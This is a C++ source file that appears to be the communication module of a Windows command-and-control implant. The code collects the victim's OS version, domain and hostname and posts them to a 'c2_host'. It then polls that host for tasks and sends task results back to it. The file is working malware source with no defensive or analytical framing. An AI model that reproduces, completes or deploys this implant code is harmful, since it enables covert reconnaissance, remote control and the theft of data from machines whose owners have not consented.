#include "functions.h"


namespace communication {
    nlohmann::json RegisterAgent(const std::wstring& c2_host) {
        nlohmann::json j;

        LPWKSTA_INFO_100 pInfo = NULL;
        if (NetWkstaGetInfo(NULL, 100, (LPBYTE*)&pInfo) != NERR_Success) {
            return nlohmann::json();
        }

        std::wstring os_version = std::to_wstring(pInfo->wki100_ver_major) + L"." + std::to_wstring(pInfo->wki100_ver_minor);
        j["os"] = misc::WideStringToUTF8(os_version);
        j["domain"] = misc::WideStringToUTF8(pInfo->wki100_langroup);
        j["hostname"] = misc::WideStringToUTF8(pInfo->wki100_computername);

        NetApiBufferFree(pInfo); // Free the allocated memory

        std::string json_data = j.dump();
        std::wstring response = network::MakeHttpRequest(c2_host, L"/register", json_data, L"POST");
        return misc::WStringToJson(response);
    }

    nlohmann::json FetchTask(const std::wstring& c2_host, const std::wstring& agent_id) {
        std::wstring path = L"/" + agent_id + L"/tasks";
        std::wstring response = network::MakeHttpRequest(c2_host, path, "", L"GET");
        return misc::WStringToJson(response);
    }

    bool SubmitResults(const std::wstring& c2_host, const std::wstring& agent_id,
        const nlohmann::json& task_result) {
        std::wstring path = L"/" + agent_id + L"/results";
        std::string json_data = task_result.dump();
        std::wstring response = network::MakeHttpRequest(c2_host, path, json_data, L"POST");
        return !response.empty();
    }
}